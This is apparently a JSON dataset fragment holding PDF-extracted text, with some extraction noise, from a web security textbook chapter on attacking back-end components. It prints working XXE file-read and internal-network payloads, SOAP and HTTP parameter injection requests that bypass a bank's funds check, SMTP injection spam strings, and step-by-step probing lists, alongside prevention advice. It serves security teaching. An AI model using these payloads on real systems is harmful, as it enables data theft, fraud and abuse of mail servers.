<!ENTITY testref “testrefvalue” > ]>\ncc1100..iinndddd 338844 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 385\nChapter 10 n Attacking Back-End Components 385\nIf a document contains this defi nition, the parser replaces any occurrences\nof the &testref; entity reference within the document with the defi ned value,\ntestrefvalue.\nFurthermore, the XML specifi cation allows entities to be defi ned using exter-\nnal references, the value of which is fetched dynamically by the XML parser.\nThese external entity defi nitions use the URL format and can refer to external\nweb URLs or resources on the local fi lesystem. The XML parser fetches the\ncontents of the specifi ed URL or fi le and uses this as the value of the defi ned\nentity. If the application returns in its response any parts of the XML data that\nuse an externally defi ned entity, the contents of the specifi ed fi le or URL are\nreturned in the response.\nExternal entities can be specifi ed within the attacker’s XML-based request\nby adding a suitable DOCTYPE element to the XML (or by modifying the element\nif it already exists). An external entity reference is specifi ed using the SYSTEM\nkeyword, and its defi nition is a URL that may use the file: protocol.\nIn the preceding example, the attacker can submit the following request, which\ndefi nes an XML external entity that references a fi le on the server’s fi lesystem:\nPOST /search/128/AjaxSearch.ashx HTTP/1.1\nHost: mdsec.net\nContent-Type: text/xml; charset=UTF-8\nContent-Length: 115\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///windows/win.ini” > ]>\n<Search><SearchTerm>&xxe;</SearchTerm></Search>\nThis causes the XML parser to fetch the contents of the specifi ed fi le and to\nuse this in place of the defi ned entity reference, which the attacker has used\nwithin the SearchTerm element. Because the value of this element is echoed in\nthe application’s response, this causes the server to respond with the contents\nof the fi le, as follows:\nHTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nContent-Length: 556\n<Search><SearchResult>No results found for expression: ; for 16-bit app\nsupport\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n...\nTRY IT!\nhttp://mdsec.net/search/128/\ncc1100..iinndddd 338855 88//1199//22001111 1122::1100::4488 PPMM"
  },
  {
    "input": "Injecting into SOAP Services",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 386\n386 Chapter 10 n Attacking Back-End Components\nIn addition to using the file: protocol to specify resources on the local\nfi lesystem, the attacker can use protocols such as http: to cause the server to\nfetch resources across the network. These URLs can specify arbitrary hosts,\nIP addresses, and ports. They may allow the attacker to interact with network\nservices on back-end systems that cannot be directly reached from the Internet.\nFor example, the following attack attempts to connect to a mail server running\non port 25 on the private IP address 192.168.1.1:\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://192.168.1.1:25” > ]>\n<Search><SearchTerm>&xxe;</SearchTerm></Search>\nThis technique may allow various attacks to be performed:\nn The attacker can use the application as a proxy, retrieving sensitive content\nfrom any web servers that the application can reach, including those running\ninternally within the organization on private, nonroutable address space.\nn The attacker can exploit vulnerabilities on back-end web applications,\nprovided that these can be exploited via the URL.\nn The attacker can test for open ports on back-end systems by cycling through\nlarge numbers of IP addresses and port numbers. In some cases, timing\ndifferences can be used to infer the state of a requested port. In other\ncases, the service banners from some services may actually be returned\nwithin the application’s responses.\nFinally, if the application retrieves the external entity but does not return this\nin responses, it may still be possible to cause a denial of service by reading a\nfi le stream indefi nitely. For example:\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “ file:///dev/random”> ]>\nInjecting into SOAP Services\nSimple Object Access Protocol (SOAP) is a message-based communications\ntechnology that uses the XML format to encapsulate data. It can be used to\nshare information and transmit messages between systems, even if these run\non different operating systems and architectures. Its primary use is in web\nservices. In the context of a browser-accessed web application, you are most\nlikely to encounter SOAP in the communications that occur between back-end\napplication components.\nSOAP is often used in large-scale enterprise applications where individual tasks\nare performed by different computers to improve performance. It is also often\nfound where a web application has been deployed as a front end to an existing\napplication. In this situation, communications between different components\nmay be implemented using SOAP to ensure modularity and interoperability.\ncc1100..iinndddd 338866 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 387\nChapter 10 n Attacking Back-End Components 387\nBecause XML is an interpreted language, SOAP is potentially vulnerable to\ncode injection in a similar way as the other examples already described. XML\nelements are represented syntactically, using the metacharacters <,>, and /. If\nuser-supplied data containing these characters is inserted directly into a SOAP\nmessage, an attacker may be able to interfere with the message’s structure and\ntherefore interfere with the application’s logic or cause other undesirable effects.\nConsider a banking application in which a user initiates a funds transfer\nusing an HTTP request like the following:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 65\nFromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit\nIn the course of processing this request, the following SOAP message is sent\nbetween two of the application’s back-end components:\n<soap:Envelope xmlns:soap=”http://www.w3.org/2001/12/soap-envelope”>\n<soap:Body>\n<pre:Add xmlns:pre=http://target/lists soap:encodingStyle=\n“http://www.w3.org/2001/12/soap-encoding”>\n<Account>\n<FromAccount>18281008</FromAccount>\n<Amount>1430</Amount>\n<ClearedFunds>False</ClearedFunds>\n<ToAccount>08447656</ToAccount>\n</Account>\n</pre:Add>\n</soap:Body>\n</soap:Envelope>\nNote how the XML elements in the message correspond to the parameters\nin the HTTP request, and also the addition of the ClearedFunds element. At\nthis point in the application’s logic, it has determined that insuffi cient funds\nare available to perform the requested transfer and has set the value of this\nelement to False. As a result, the component that receives the SOAP message\ndoes not act on it.\nIn this situation, there are various ways in which you could seek to inject\ninto the SOAP message and therefore interfere with the application’s logic. For\nexample, submitting the following request causes an additional ClearedFunds\nelement to be inserted into the message before the original element (while\npreserving the SQL’s syntactic validity). If the application processes the fi rst\nClearedFunds element it encounters, you may succeed in performing a transfer\nwhen no funds are available:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\ncc1100..iinndddd 338877 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 388\n388 Chapter 10 n Attacking Back-End Components\nContent-Length: 119\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit\nOn the other hand, if the application processes the last ClearedFunds element\nit encounters, you could inject a similar attack into the ToAccount parameter.\nA different type of attack would be to use XML comments to remove part of\nthe original SOAP message and replace the removed elements with your own.\nFor example, the following request injects a ClearedFunds element via the Amount\nparameter, provides the opening tag for the ToAccount element, opens a com-\nment, and closes the comment in the ToAccount parameter, thus preserving the\nsyntactic validity of the XML:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 125\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit\nA further type of attack would be to attempt to complete the entire SOAP\nmessage from within an injected parameter and comment out the remainder\nof the message. However, because the opening comment will not be matched\nby a closing comment, this attack produces strictly invalid XML, which many\nXML parsers will reject. This attack is only likely to work against a custom,\nhomegrown XML parser, rather than any XML parsing library:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 176\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds>\n<ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body>\n</soap:Envelope>\n<!--&Submit=Submit\nTRY IT!\nThis example contains a helpful error message that enables you to fi ne-\ntune your attack:\nhttp://mdsec.net/bank/27/\nThe following examples contain the identical vulnerability, but the error\nfeedback is much more sparse. See how diffi cult it can be to exploit SOAP\ninjection without helpful error messages?\nhttp://mdsec.net/bank/18/\nhttp://mdsec.net/bank/6/\ncc1100..iinndddd 338888 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "Finding and Exploiting SOAP Injection",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 389\nChapter 10 n Attacking Back-End Components 389\nFinding and Exploiting SOAP Injection\nSOAP injection can be diffi cult to detect, because supplying XML metacharacters\nin a noncrafted way breaks the format of the SOAP message, often resulting in\nan uninformative error message. Nevertheless, the following steps can be used\nto detect SOAP injection vulnerabilities with a degree of reliability.\nHACK STEPS\n1. Submit a rogue XML closing tag such as </foo> in each parameter in turn.\nIf no error occurs, your input is probably not being inserted into a SOAP\nmessage, or it is being sanitized in some way.\n2. If an error was received, submit instead a valid opening and closing tag\npair, such as <foo></foo>. If this causes the error to disappear, the\napplication may be vulnerable.\n3. In some situations, data that is inserted into an XML-formatted mes-\nsage is subsequently read back from its XML form and returned to the\nuser. If the item you are modifying is being returned in the application’s\nresponses, see whether any XML content you submit is returned in its\nidentical form or has been normalized in some way. Submit the following\ntwo values in turn:\ntest<foo/>\ntest<foo></foo>\nIf you find that either item is returned as the other, or simply as test,\nyou can be confident that your input is being inserted into an XML-based\nmessage.\n4. If the HTTP request contains several parameters that may be being placed\ninto a SOAP message, try inserting the opening comment character (<!-\n-) into one parameter and the closing comment character (!-->) into\nanother parameter. Then switch these around (because you have no way\nof knowing in which order the parameters appear). Doing so can have the\neffect of commenting out a portion of the server’s SOAP message. This\nmay cause a change in the application’s logic or result in a different error\ncondition that may divulge information.\nIf SOAP injection is diffi cult to detect, it can be even harder to exploit. In most\nsituations, you need to know the structure of the XML that surrounds your data\nto supply crafted input that modifi es the message without invalidating it. In all\nthe preceding tests, look for any error messages that reveal any details about\nthe SOAP message being processed. If you are lucky, a verbose message will\ndisclose the entire message, enabling you to construct crafted values to exploit\nthe vulnerability. If you are unlucky, you may be restricted to pure guesswork,\nwhich is very unlikely to be successful.\ncc1100..iinndddd 338899 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "Server-side HTTP Redirection",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 390\n390 Chapter 10 n Attacking Back-End Components\nPreventing SOAP Injection\nYou can prevent SOAP injection by employing boundary validation fi lters at any\npoint where user-supplied data is inserted into a SOAP message (see Chapter\n2). This should be performed both on data that has been immediately received\nfrom the user in the current request and on any data that has been persisted from\nearlier requests or generated from other processing that takes user data as input.\nTo prevent the attacks described, the application should HTML-encode any\nXML metacharacters appearing in user input. HTML encoding involves replacing\nliteral characters with their corresponding HTML entities. This ensures that the\nXML interpreter treats them as part of the data value of the relevant element and\nnot as part of the structure of the message itself. Here are the HTML encodings\nof some common problematic characters:\nn < — &lt;\nn > — &gt;\nn / — &#47;\nInjecting into Back-end HTTP Requests\nThe preceding section described how some applications incorporate user-supplied\ndata into back-end SOAP requests to services that are not directly accessible\nto the user. More generally, applications may embed user input in any kind of\nback-end HTTP request, including those that transmit parameters as regular\nname/value pairs. This kind of behavior is often vulnerable to attack, since the\napplication often effectively proxies the URL or parameters supplied by the user.\nAttacks against this functionality can be divided into the following categories:\nn Server-side HTTP redirection attacks allow an attacker to specify an arbitrary\nresource or URL that is then requested by the front-end application server.\nn HTTP parameter injection (HPI) attacks allow an attacker to inject arbi-\ntrary parameters into a back-end HTTP request made by the application\nserver. If an attacker injects a parameter that already exists in the back-end\nrequest, HTTP parameter pollution (HPP) attacks can be used to override\nthe original parameter value specifi ed by the server.\nServer-side HTTP Redirection\nServer-side redirection vulnerabilities arise when an application takes user-\ncontrollable input and incorporates it into a URL that it retrieves using a back-\nend HTTP request. The user-supplied input may comprise the entire URL that\nis retrieved, or the application may perform some processing on it, such as\nadding a standard suffi x.\ncc1100..iinndddd 339900 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 391\nChapter 10 n Attacking Back-End Components 391\nThe back-end HTTP request may be to a domain on the public Internet,\nor it may be to an internal server not directly accessible by the user. The\ncontent requested may be core to the application’s functionality, such as an\ninterface to a payment gateway. Or it may be more peripheral, such as static\ncontent drawn from a third party. This technique is often used to knit several\ndisparate internal and external application components into a single front-\napplication that handles access control and session management on behalf\nof these other systems. If an attacker can control the IP address or hostname\nused in the back-end HTTP request, he can cause the application server to\nconnect to an arbitrary resource and sometimes retrieve the contents of the\nback-end response.\nConsider the following example of a front-end request, in which the loc\nparameter is used to specify which version of a CSS fi le the client wants to use:\nPOST /account/home HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: wahh-blogs.net\nContent-Length: 65\nview=default&loc=online.wahh-blogs.net/css/wahh.css\nIf no validation of the URL is specifi ed in the loc parameter, an attacker can\nspecify an arbitrary hostname in place of online.wahh-blogs.net. The applica-\ntion retrieves the specifi ed resource, allowing the attacker to use the application\nas a proxy to potentially sensitive back-end services. In the following example,\nthe attacker causes the application to connect to a back-end SSH service:\nPOST /account/home HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: blogs.mdsec.net\nContent-Length: 65\nview=default&loc=192.168.0.1:22\nThe application’s response includes the banner from the requested SSH service:\nHTTP/1.1 200 OK\nConnection: close\nSSH-2.0-OpenSSH_4.2Protocol mismatch.\nAn attacker can exploit server-side HTTP redirection bugs to effectively use the\nvulnerable application as an open HTTP proxy to perform various further attacks:\nn An attacker may be able to use the proxy to attack third-party systems on\nthe Internet. The malicious traffi c appears to the target to originate from\nthe server on which the vulnerable application is running.\nn An attacker may be able to use the proxy to connect to arbitrary hosts on\nthe organization’s internal network, thereby reaching targets that cannot\nbe accessed directly from the Internet.\ncc1100..iinndddd 339911 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 392\n392 Chapter 10 n Attacking Back-End Components\nn An attacker may be able to use the proxy to connect back to other services\nrunning on the application server itself, circumventing fi rewall restrictions\nand potentially exploiting trust relationships to bypass authentication.\nn Finally, the proxy functionality could be used to deliver attacks such as\ncross-site scripting by causing the application to include attacker-controlled\ncontent within its responses (see Chapter 12 for more details).\nHACK STEPS\n1. Identify any request parameters that appear to contain hostnames, IP\naddresses, or full URLs.\n2. For each parameter, modify its value to specify an alternative resource,\nsimilar to the one being requested, and see if that resource appears in the\nserver’s response.\n3. Try specifying a URL targeting a server on the Internet that you control,\nand monitor that server for incoming connections from the application\nyou are testing.\n4. If no incoming connection is received, monitor the time taken for the\napplication to respond. If there is a delay, the application’s back-end\nrequests may be timing out due to network restrictions on outbound\nconnections.\n5. If you are successful in using the functionality to connect to arbitrary\nURLs, try to perform the following attacks:\na. Determine whether the port number can be specified. For example,\nyou might supply http://mdattacker.net:22.\nb. If successful, attempt to port-scan the internal network by using a tool\nsuch as Burp Intruder to connect to a range of IP addresses and ports\nin sequence (see Chapter 14).\nc. Attempt to connect to other services on the loopback address of the\napplication server.\nd. Attempt to load a web page that you control into the application’s\nresponse to deliver a cross-site scripting attack.\nNOTE Some server-side redirection APIs, such as Server.Transfer()\nand Server.Execute() in ASP.NET, allow redirection only to relative URLs\non the same host. Functionality that passes user-supplied input to one of\nthese methods can still potentially be exploited to exploit trust relation-\nships and access resources on the server that are protected by platform-level\nauthentication.\ncc1100..iinndddd 339922 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "HTTP Parameter Injection",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 393\nChapter 10 n Attacking Back-End Components 393\nTRY IT!\nhttp://mdsec.net/updates/97/\nhttp://mdsec.net/updates/99/\nHTTP Parameter Injection\nHTTP parameter injection (HPI) arises when user-supplied parameters are\nused as parameters within a back-end HTTP request. Consider the following\nvariation on the bank transfer functionality that was previously vulnerable to\nSOAP injection:\nPOST /bank/48/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 65\nFromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit\nThis front-end request, sent from the user’s browser, causes the application\nto make a further back-end HTTP request to another web server within the\nbank’s infrastructure. In this back-end request, the application copies some of\nthe parameter values from the front-end request:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 44\nfromacc=18281008&amount=1430&toacc=08447656\nThis request causes the back-end server to check whether cleared funds are\navailable to perform the transfer and, if so, to carry it out. However, the front-\nend server can optionally specify that cleared funds are available, and therefore\nbypass the check, by supplying the following parameter:\nclearedfunds=true\nIf the attacker is aware of this behavior, he can attempt to perform an HPI\nattack to inject the clearedfunds parameter into the back-end request. To do\nthis, he adds the required parameter onto the end of an existing parameter’s\nvalue and URL-encodes the characters & and =, which are used to separate\nnames and values:\nPOST /bank/48/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 96\nFromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3dtru\ne&Submit=Submit\ncc1100..iinndddd 339933 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 394\n394 Chapter 10 n Attacking Back-End Components\nWhen the application server processes this request, it URL-decodes the param-\neter values in the normal way. So the value of the ToAccount parameter that the\nfront-end application receives is as follows:\n08447656&clearedfunds=true\nIf the front-end application does not validate this value and passes it through\nunsanitized into the back-end request, the following back-end request is made,\nwhich successfully bypasses the check for cleared funds:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 62\nfromacc=18281008&amount=1430&toacc=08447656&clearedfunds=true\nTRY IT!\nhttp://mdsec.net/bank/48/\nNOTE Unlike with SOAP injection, injecting arbitrary unexpected parameters\ninto a back-end request is unlikely to cause any kind of error. Therefore, a suc-\ncessful attack normally requires exact knowledge of the back-end parameters\nthat are being used. Although this may be hard to determine in a blackbox\ncontext, it may be straightforward if the application uses any third-party com-\nponents whose code can be obtained and researched.\nHTTP Parameter Pollution\nHPP is an attack technique that arises in various contexts (see Chapters 12 and\n13 for other examples) and that often applies in the context of HPI attacks.\nThe HTTP specifi cations provide no guidelines as to how web servers should\nbehave when a request contains multiple parameters with the same name. In\npractice, different web servers behave in different ways. Here are some com-\nmon behaviors:\nn Use the fi rst instance of the parameter.\nn Use the last instance of the parameter.\nn Concatenate the parameter values, maybe adding a separator between them.\nn Construct an array containing all the supplied values.\nIn the preceding HPI example, the attacker could add a new parameter to\na back-end request. In fact, it is more likely in practice that the request into\nwhich the attacker can inject already contains a parameter with the name he\ncc1100..iinndddd 339944 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 395\nChapter 10 n Attacking Back-End Components 395\nis targeting. In this situation, the attacker can use the HPI condition to inject a\nsecond instance of the same parameter. The resulting application behavior then\ndepends on how the back-end HTTP server handles the duplicated parameter.\nThe attacker may be able to use the HPP technique to “override” the value of\nthe original parameter with the value of his injected parameter.\nFor example, if the original back-end request is as follows:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 62\nfromacc=18281008&amount=1430&clearedfunds=false&toacc=08447656\nand the back-end server uses the fi rst instance of any duplicated parameter, an\nattacker can place the attack into the FromAccount parameter in the front-end\nrequest:\nPOST /bank/52/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 96\nFromAccount=18281008%26clearedfunds%3dtrue&Amount=1430&ToAccount=0844765\n6&Submit=Submit\nConversely, in this example, if the back-end server uses the last instance of\nany duplicated parameter, the attacker can place the attack into the ToAccount\nparameter in the front-end request.\nTRY IT!\nhttp://mdsec.net/bank/52/\nhttp://mdsec.net/bank/57/\nThe results of HPP attacks are heavily dependent on how the target applica-\ntion server handles multiple occurrences of the same parameter, and the precise\ninsertion point within the back-end request. This has signifi cant consequences\nif two technologies need to process the same HTTP request. A web application\nfi rewall or reverse proxy may process a request and pass it to the web application,\nwhich may proceed to discard variables, or even build strings out of previously\ndisparate portions of the request!\nA good paper covering the different behaviors of the common application\nservers can be found here:\nwww.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf\ncc1100..iinndddd 339955 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 396\n396 Chapter 10 n Attacking Back-End Components\nAttacks Against URL Translation\nMany servers rewrite requested URLs on arrival to map these onto the relevant\nback-end functions within the application. In addition to conventional URL\nrewriting, this behavior can arise in the context of REST-style parameters, cus-\ntom navigation wrappers, and other methods of URL translation. The kind of\nprocessing that this behavior involves can be vulnerable to HPI and HPP attacks.\nFor simplicity and to aid navigation, some applications place parameter values\nwithin the fi le path of the URL, rather than the query string. This can often be\nachieved with some simple rules to transform the URL and forward it to the\ntrue destination. The following mod_rewrite rules in Apache are used to handle\npublic access to user profi les:\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /pub/user/[^\\&]*\\ HTTP/\nRewriteRule ^pub/user/([^/\\.]+)$ /inc/user_mgr.php?mode=view&name=$1\nThis rule takes aesthetically pleasing requests such as:\n/pub/user/marcus\nand transforms them into back-end requests for the view functionality contained\nwithin the user management page user_mgr.php. It moves the marcus parameter\ninto the query string and adds the mode=view parameter:\n/inc/user_mgr.php?mode=view&name=marcus\nIn this situation, it may be possible to use an HPI attack to inject a second mode\nparameter into the rewritten URL. For example, if the attacker requests this:\n/pub/user/marcus%26mode=edit\nthe URL-decoded value is embedded in the rewritten URL as follows:\n/inc/user_mgr.php?mode=view&name=marcus&mode=edit\nAs was described for HPP attacks, the success of this exploit depends on\nhow the server handles the now-duplicated parameter. On the PHP platform,\nthe mode parameter is treated as having the value edit, so the attack succeeds.\ncc1100..iinndddd 339966 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "Injecting into Mail Services",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 397\nChapter 10 n Attacking Back-End Components 397\nHACK STEPS\n1. Target each request parameter in turn, and try to append a new injected\nparameter using various syntax:\nn %26foo%3dbar — URL-encoded &foo=bar\nn %3bfoo%3dbar — URL-encoded ;foo=bar\nn %2526foo%253dbar — Double URL-encoded &foo=bar\n2. Identify any instances where the application behaves as if the original\nparameter were unmodified. (This applies only to parameters that usually\ncause some difference in the application’s response when modified.)\n3. Each instance identified in the previous step has a chance of parameter\ninjection. Attempt to inject a known parameter at various points in the\nrequest to see if it can override or modify an existing parameter. For\nexample:\nFromAccount=18281008%26Amount%3d4444&Amount=1430&ToAcco\nunt=08447656\n4. If this causes the new value to override the existing one, determine\nwhether you can bypass any front-end validation by injecting a value that\nis read by a back-end server.\n5. Replace the injected known parameter with additional parameter names\nas described for application mapping and content discovery in Chapter 4.\n6. Test the application’s tolerance of multiple submissions of the same\nparameter within a request. Submit redundant values before and after\nother parameters, and at different locations within the request (within the\nquery string, cookies, and the message body).\nInjecting into Mail Services\nMany applications contain a facility for users to submit messages via the appli-\ncation, such as to report a problem to support personnel or provide feedback\nabout the website. This facility is usually implemented by interfacing with a\nmail (or SMTP) server. Typically, user-supplied input is inserted into the SMTP\ncc1100..iinndddd 339977 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "E-mail Header Manipulation",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 398\n398 Chapter 10 n Attacking Back-End Components\nconversation that the application server conducts with the mail server. If an\nattacker can submit suitable crafted input that is not fi ltered or sanitized, he\nmay be able to inject arbitrary STMP commands into this conversation.\nIn most cases, the application enables you to specify the contents of the mes-\nsage and your own e-mail address (which is inserted into the From fi eld of the\nresulting e-mail). You may also be able to specify the subject of the message and\nother details. Any relevant fi eld that you control may be vulnerable to SMTP\ninjection.\nSMTP injection vulnerabilities are often exploited by spammers who scan\nthe Internet for vulnerable mail forms and use these to generate large volumes\nof nuisance e-mail.\nE-mail Header Manipulation\nConsider the form shown in Figure 10-6, which allows users to send feedback\nabout the application.\nFigure 10-6: A typical site feedback form\nHere, users can specify a From address and the contents of the message. The\napplication passes this input to the PHP mail() command, which constructs\nthe e-mail and performs the necessary SMTP conversation with its confi gured\nmail server. The mail generated is as follows:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nSubject: Site problem\nConfirm Order page doesn’t load\nThe PHP mail() command uses an additional_headers parameter to set the\nmessage’s From address. This parameter is also used to specify other headers,\nincluding Cc and Bcc, by separating each required header with a newline char-\nacter. Hence, an attacker can cause the message to be sent to arbitrary recipients\nby injecting one of these headers into the From fi eld, as illustrated in Figure 10-7.\ncc1100..iinndddd 339988 88//1199//22001111 1122::1100::4499 PPMM"
  },
  {
    "input": "SMTP Command Injection",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 399\nChapter 10 n Attacking Back-End Components 399\nFigure 10-7: An e-mail header injection attack\nThis causes the mail() command to generate the following message:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nBcc: all@wahh-othercompany.com\nSubject: Site problem\nConfirm Order page doesn’t load\nSMTP Command Injection\nIn other cases, the application may perform the SMTP conversation itself, or it\nmay pass user-supplied input to a different component to do this. In this situ-\nation, it may be possible to inject arbitrary SMTP commands directly into this\nconversation, potentially taking full control of the messages being generated\nby the application.\nFor example, consider an application that uses requests of the following form\nto submit site feedback:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 56\nFrom=daf@wahh-mail.com&Subject=Site+feedback&Message=foo\nThis causes the web application to perform an SMTP conversation with the\nfollowing commands:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site feedback\nfoo\n.\ncc1100..iinndddd 339999 88//1199//22001111 1122::1100::5500 PPMM"
  },
  {
    "input": "Finding SMTP Injection Flaws",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 400\n400 Chapter 10 n Attacking Back-End Components\nNOTE After the SMTP client issues the DATA command, it sends the contents\nof the e-mail message, comprising the message headers and body. Then it\nsends a single dot character on its own line. This tells the server that the mes-\nsage is complete, and the client can then issue further SMTP commands to\nsend further messages.\nIn this situation, you may be able to inject arbitrary SMTP commands into\nany of the e-mail fi elds you control. For example, you can attempt to inject into\nthe Subject fi eld as follows:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 266\nFrom=daf@wahh-mail.com&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d\n%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail\n.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail\n.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo\nIf the application is vulnerable, this results in the following SMTP conversa-\ntion, which generates two different e-mail messages. The second is entirely\nwithin your control:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site+feedback\nfoo\n.\nMAIL FROM: mail@wahh-viagra.com\nRCPT TO: john@wahh-mail.com\nDATA\nFrom: mail@wahh-viagra.com\nTo: john@wahh-mail.com\nSubject: Cheap V1AGR4\nBlah\n.\nfoo\n.\nFinding SMTP Injection Flaws\nTo probe an application’s mail functionality effectively, you need to target every\nparameter that is submitted to an e-mail-related function, even those that may\ninitially appear to be unrelated to the content of the generated message. You\ncc1100..iinndddd 440000 88//1199//22001111 1122::1100::5500 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 401\nChapter 10 n Attacking Back-End Components 401\nshould also test for each kind of attack, and you should perform each test case\nusing both Windows- and UNIX-style newline characters.\nHACK STEPS\n1. You should submit each of the following test strings as each parameter in\nturn, inserting your own e-mail address at the relevant position:\n<youremail>%0aCc:<youremail>\n<youremail>%0d%0aCc:<youremail>\n<youremail>%0aBcc:<youremail>\n<youremail>%0d%0aBcc:<youremail>\n%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y\nouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS\nubject:+test%0afoo%0a%2e%0a\n%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0\nd%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%\n0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0\nafoo%0d%0a%2e%0d%0a\n2. Note any error messages the application returns. If these appear to relate\nto any problem in the e-mail function, investigate whether you need to\nfine-tune your input to exploit a vulnerability.\n3. The application’s responses may not indicate in any way whether a vul-\nnerability exists or was successfully exploited. You should monitor the\ne-mail address you specified to see if any mail is received.\n4. Review closely the HTML form that generates the relevant request. This\nmay contain clues about the server-side software being used. It may also\ncontain a hidden or disabled field that specifies the e-mail’s To address,\nwhich you can modify directly.\nTIP Functions to send e-mails to application support personnel are fre-\nquently regarded as peripheral and may not be subject to the same security\nstandards or testing as the main application functionality. Also, because they\ninvolve interfacing to an unusual back-end component, they are often imple-\nmented via a direct call to the relevant operating system command. Hence,\nin addition to probing for SMTP injection, you should also closely review all\ne-mail-related functionality for OS command injection fl aws.\ncc1100..iinndddd 440011 88//1199//22001111 1122::1100::5500 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 402\n402 Chapter 10 n Attacking Back-End Components\nPreventing SMTP Injection\nSMTP injection vulnerabilities usually can be prevented by implementing rig-\norous validation of any user-supplied data that is passed to an e-mail function\nor used in an SMTP conversation. Each item should be validated as strictly as\npossible given the purpose for which it is being used:\nn E-mail addresses should be checked against a suitable regular expression\n(which should, of course, reject any newline characters).\nn The message subject should not contain any newline characters, and it\nmay be limited to a suitable length.\nn If the contents of a message are being used directly in an SMTP conversa-\ntion, lines containing just a single dot should be disallowed.\nSummary\nWe have examined a wide range of attacks targeting back-end application\ncomponents and the practical steps you can take to identify and exploit each\none. Many real-world vulnerabilities can be discovered within the fi rst few\nseconds of interacting with an application. For example, you could enter some\nunexpected syntax into a search box. In other cases, these vulnerabilities may\nbe highly subtle, manifesting themselves in scarcely detectable differences in\nthe application’s behavior, or reachable only through a multistage process of\nsubmitting and manipulating crafted input.\nTo be confi dent that you have uncovered the back-end injection fl aws that\nexist within an application, you need to be both thorough and patient. Practically\nevery type of vulnerability can manifest itself in the processing of practically\nany item of user-supplied data, including the names and values of query string\nparameters, POST data and cookies, and other HTTP headers. In many cases, a\ndefect emerges only after extensive probing of the relevant parameter as you\nlearn exactly 